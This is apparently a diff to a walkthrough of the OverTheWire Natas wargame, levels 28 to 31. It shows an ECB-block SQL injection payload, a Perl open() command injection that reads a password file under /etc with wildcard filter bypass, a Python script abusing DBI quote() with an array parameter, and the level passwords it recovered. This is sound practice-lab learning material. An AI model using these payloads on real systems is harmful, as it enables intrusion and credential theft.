+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+b39038c28df79b65d26151df58f7eaa3
+b39038c28df79b65d26151df58f7eaa3
+738a5ffb4a4500246775175ae596bbd6
+f34df339c69edce11f6650bbced62702
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+b39038c28df79b65d26151df58f7eaa3
+b39038c28df79b65d26151df58f7eaa3
+b4eda087d3c0bea2bedc1b6140b9e2eb
+ca8cf4e610913abae39a067619204a5a
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+b39038c28df79b65d26151df58f7eaa3
+b39038c28df79b65d26151df58f7eaa3
+ce82a9553b65b81280fb6d3bf2900f47
+75fd5044fd063d26f6bb7f734b41c899
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+b39038c28df79b65d26151df58f7eaa3
+b39038c28df79b65d26151df58f7eaa3
+1f74714d76fcc5d464c6a221e6ed98e4
+6223a14d9c4291b98775b03fbc73d4ed
+d8ae51d7da71b2b083d919a0d7b88b98
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+b39038c28df79b65d26151df58f7eaa3
+b39038c28df79b65d26151df58f7eaa3
+ecd36f8fd9164d403540e449707d27e5
+4257a343daadaaf2c0e3a1d71ce03dd1
+7b7baca655f298a321e90e3f7a60d4d8
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+b39038c28df79b65d26151df58f7eaa3
+b39038c28df79b65d26151df58f7eaa3
+5aef2a997da2363f72a3fad332d1736f
+a773f3185094aa01408f1f97d037d385
+678c5773ecc28f870e4f4ebc6c8070a4
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+b39038c28df79b65d26151df58f7eaa3
+b39038c28df79b65d26151df58f7eaa3
+8925158cfc5ac06d22bfda0b72c8f151
+a77e8ed1aabe0b5d05c4ffe6ac1423ab
+478eb1a1fe261a2c6c15061109b3feda
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+b39038c28df79b65d26151df58f7eaa3
+b39038c28df79b65d26151df58f7eaa3
+adf8a1ad0177ed1ecad3ac7c1082aa9e
+bdfa1054ec68515cf96f2a5544591947
+904f4b2abf2c2d7686aa72a53151c970
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e
+b39038c28df79b65d26151df58f7eaa3
+b39038c28df79b65d26151df58f7eaa3
+53d9499ebcad6861f04b7cdc24f30462
+48799a07b1d29b5982015c9355c2e00e
+aded9bdbaca6a73b71b35a010d2c4c57
+
+```
+from the observation, can identify that 
+from 1`a` until 9`a`, the first 2 lines are fixed
+from 10`a` until 25`a`, the first 3 lines are fixed
+from 26`a` until 41`a`, the first 4 lines are fixed
+from 41`a` onwards, the first 5 lines are fixed
+
+
+take the example for 10`a`, 11`a` and 12`a`: 
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e    XXXXXXaaaaaaaaaa
+738a5ffb4a4500246775175ae596bbd6
+f34df339c69edce11f6650bbced62702
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e    XXXXXXaaaaaaaaaa
+b4eda087d3c0bea2bedc1b6140b9e2eb    a
+ca8cf4e610913abae39a067619204a5a
+
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e    XXXXXXaaaaaaaaaa
+ce82a9553b65b81280fb6d3bf2900f47    aa
+75fd5044fd063d26f6bb7f734b41c899
+
+
+### Approach 
+to exploit this, can use the payload `aaaaaaaaa' UNION SELECT password from users;#`.
+the payload is using 9`a` because the " in the input will be treated as \" for input validation. Thus, one place for `a` need to be reserved for `\`. 
+
+after we input the payload, the query obtained is `G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPIR27gK4CQl3Jcmv%2F0YAxYOWnPci%2FqKte0ohRTkObF%2BT4aVF1T3rVZFTrXVtnaO5kYxm5xtyst2O9VZ%2FszQKTUzQlejQ9qtqvLA46HXHOA90Xt7rKZV8pijIekOP3pg1Ng%3D`
+then, transform into the hex format.
+```
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+11dbb80ae02425dc9726bffd1803160e    XXXXXXaaaaaaaaa\
+5a73dc8bfa8ab5ed288514e439b17e4f    ' UNION SELECT ....
+86951754f7ad56454eb5d5b6768ee646
+319b9c6dcacb763bd559feccd0293533
+4257a343daadaaf2c0e3a1d71ce03dd1
+7b7baca655f298a321e90e3f7a60d4d8    .... users;#
+```
+
+to exploit this, we can change the 3rd line to the 10`a` format, so that it become: 
+```
+1be82511a7ba5bfd578c0eef466db59c
+dc84728fdcf89d93751d10a7c75c8cf2
+c0872dee8bc90b1156913b08a223a39e    XXXXXXaaaaaaaaaa
+5a73dc8bfa8ab5ed288514e439b17e4f    ' UNION SELECT ....
+86951754f7ad56454eb5d5b6768ee646
+319b9c6dcacb763bd559feccd0293533
+4257a343daadaaf2c0e3a1d71ce03dd1
+7b7baca655f298a321e90e3f7a60d4d8    .... users;#
+```
+then, transform this into url encoded format and use it as query. just reverse the recipe. and the query we obtained become `G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeWnPci%2FqKte0ohRTkObF%2BT4aVF1T3rVZFTrXVtnaO5kYxm5xtyst2O9VZ%2FszQKTUzQlejQ9qtqvLA46HXHOA90Xt7rKZV8pijIekOP3pg1Ng%3D`
+
+then, the webpage display
+```
+Whack Computer Joke Database
+
+    31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns
+```
+
+
 
 ### Analysis
 
@@ -4366,13 +4909,55 @@ After login, the following note is displayed:
 ```
 URL: http://natas29.natas.labs.overthewire.org
 Username: natas29
-Password: 
+Password: 31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns
 ```
-After login, the following note is displayed: 
+After login, the webpage display
+```
+H3y K1dZ,
+y0 rEm3mB3rz p3Rl rit3?
+\/\/4Nn4 g0 olD5kewL? R3aD Up!
 
-### Approach 
+                        c4n Y0 h4z s4uc3?
+```
+
+along with the dropdown selection: 
+s3IEcT suMp1n!
+perl underground
+perl underground 2
+perl underground 3
+perl underground 4
+perl underground 5
 
 ### Finding 
+if selecting `perl underground 2` the page will navigate to `http://natas29.natas.labs.overthewire.org/index.pl?file=perl+underground+2`
+same to other, the page will navigate to specific page depending on the dropdown selection chosen. 
+
+
+### Approach 
+to exploit it, we can enclose the command in |<command>%00. for example `http://natas29.natas.labs.overthewire.org/index.pl?file=|ls%20-l%00`
+here we excute the command `ls -l` and the output is (after prettified)
+```
+total 804
+-r-xr-x--- 1 natas29 natas29 2286 Apr 3 15:07 index.pl
+-r-xr-x--- 1 natas29 natas29 172923 Apr 3 15:07 perl underground 2.txt
+-r-xr-x--- 1 natas29 natas29 180749 Apr 3 15:07 perl underground 3.txt
+-r-xr-x--- 1 natas29 natas29 170534 Apr 3 15:07 perl underground 4.txt
+-r-xr-x--- 1 natas29 natas29 171845 Apr 3 15:07 perl underground 5.txt
+-r-xr-x--- 1 natas29 natas29 114600 Apr 3 15:07 perl underground.txt
+```
+we need to execute this command becuase directly exeute the command for cat /etc/natas_webpass/natas30 will return `meeeeeep!`, which indicate the error. 
+
+for further inspection, we need to view the content of the index.pl, using the command `cat index.pl`. 
+```
+END if(param('file')){ $f=param('file'); if($f=~/natas/){ print "meeeeeep!
+"; } else{ open(FD, "$f.txt"); print "
+```
+
+from this, can know that command used cannot include ~/natas/. Else the `meeeeeep!` will be returned. 
+
+To solve this, can use the wildcard. Either `cat /etc/*_webpass/*30` or `cat /etc/na?as_webpass/nat?s30` will do, as long as 'natas' wording is not existed as command. 
+
+change the url to `http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/*_webpass/*30%00` return `WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH`
 
 ### Analysis
 
@@ -4383,13 +4968,117 @@ After login, the following note is displayed:
 ```
 URL: http://natas30.natas.labs.overthewire.org
 Username: natas30
-Password: 
-```
-After login, the following note is displayed: 
+Password: WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH
 
-### Approach 
+```
+After login, the webpage request for username and password input along with the login button. 
+below is the content of source code: 
+```
+/var/www/natas/natas30/index-source.pl
+
+#!/usr/bin/perl
+use CGI qw(:standard);
+use DBI;
+
+print <<END;
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas30", "pass": "<censored>" };</script></head>
+<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">
+
+<!-- morla/10111 <3  happy birthday OverTheWire! <3  -->
+
+<h1>natas30</h1>
+<div id="content">
+
+<form action="index.pl" method="POST">
+Username: <input name="username"><br>
+Password: <input name="password" type="password"><br>
+<input type="submit" value="login" />
+</form>
+END
+
+if ('POST' eq request_method && param('username') && param('password')){
+    my $dbh = DBI->connect( "DBI:mysql:natas30","natas30", "<censored>", {'RaiseError' => 1});
+    my $query="Select * FROM users where username =".$dbh->quote(param('username')) . " and password =".$dbh->quote(param('password')); 
+
+    my $sth = $dbh->prepare($query);
+    $sth->execute();
+    my $ver = $sth->fetch();
+    if ($ver){
+        print "win!<br>";
+        print "here is your result:<br>";
+        print @$ver;
+    }
+    else{
+        print "fail :(";
+    }
+    $sth->finish();
+    $dbh->disconnect();
+}
+
+print <<END;
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+END
+```
 
 ### Finding 
+attempt to enter the username and password always return `fail :(`
+
+
+### Approach 
+test.py code: 
+```python
+import requests
+authentication = requests.auth.HTTPBasicAuth('natas30', 'WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH')
+url = 'http://natas30.natas.labs.overthewire.org/index.pl'
+params = {"username": "natas31", "password": ["'test' or true", 4]}
+response = requests.post(url, data=params, auth=authentication)
+print(response.text)
+```
+
+run the python script using the command `python test.py`
+below is the output obtained: 
+```
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas30", "pass": "WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH" };</script></head>
+<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">
+
+<!-- morla/10111 <3  happy birthday OverTheWire! <3  -->
+
+<h1>natas30</h1>
+<div id="content">
+
+<form action="index.pl" method="POST">
+Username: <input name="username"><br>
+Password: <input name="password" type="password"><br>
+<input type="submit" value="login" />
+</form>
+win!<br>here is your result:<br>natas31m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
 
 ### Analysis
 
@@ -4400,9 +5089,128 @@ After login, the following note is displayed:
 ```
 URL: http://natas31.natas.labs.overthewire.org
 Username: natas31
-Password: 
+Password: m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y
 ```
-After login, the following note is displayed: 
+After login, the webpage displayed: 
+```
+ CSV2HTML
+
+We all like .csv files.
+But isn't a nicely rendered and sortable table much cooler?
+```
+
+and request user to select file to upload along with browse and upload button. 
+
+below is the source code: 
+```
+/var/www/natas/natas31/index-source.pl
+
+#!/usr/bin/perl
+use CGI;
+$ENV{'TMPDIR'}="/var/www/natas/natas31/tmp/";
+
+print <<END;
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<!-- Bootstrap -->
+<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas31", "pass": "<censored>" };</script>
+<script src="sorttable.js"></script>
+</head>
+<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>
+
+<!-- morla/10111 -->
+<style>
+#content {
+    width: 900px;
+}
+.btn-file {
+    position: relative;
+    overflow: hidden;
+}
+.btn-file input[type=file] {
+    position: absolute;
+    top: 0;
+    right: 0;
+    min-width: 100%;
+    min-height: 100%;
+    font-size: 100px;
+    text-align: right;
+    filter: alpha(opacity=0);
+    opacity: 0;
+    outline: none;
+    background: white;
+    cursor: inherit;
+    display: block;
+}
+
+</style>
+
+
+<h1>natas31</h1>
+<div id="content">
+END
+
+my $cgi = CGI->new;
+if ($cgi->upload('file')) {
+    my $file = $cgi->param('file');
+    print '<table class="sortable table table-hover table-striped">';
+    $i=0;
+    while (<$file>) {
+        my @elements=split /,/, $_;
+
+        if($i==0){ # header
+            print "<tr>";
+            foreach(@elements){
+                print "<th>".$cgi->escapeHTML($_)."</th>";   
+            }
+            print "</tr>";
+        }
+        else{ # table content
+            print "<tr>";
+            foreach(@elements){
+                print "<td>".$cgi->escapeHTML($_)."</td>";   
+            }
+            print "</tr>";
+        }
+        $i+=1;
+    }
+    print '</table>';
+}
+else{
+print <<END;
+
+<form action="index.pl" method="post" enctype="multipart/form-data">
+    <h2> CSV2HTML</h2>
+    <br>
+    We all like .csv files.<br>
+    But isn't a nicely rendered and sortable table much cooler?<br>
+    <br>
+    Select file to upload:
+    <span class="btn btn-default btn-file">
+        Browse <input type="file" name="file">
+    </span>    
+    <input type="submit" value="Upload" name="submit" class="btn">
+</form> 
+END
+}
+
+print <<END;
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+END
+```
 
 ### Approach 
 
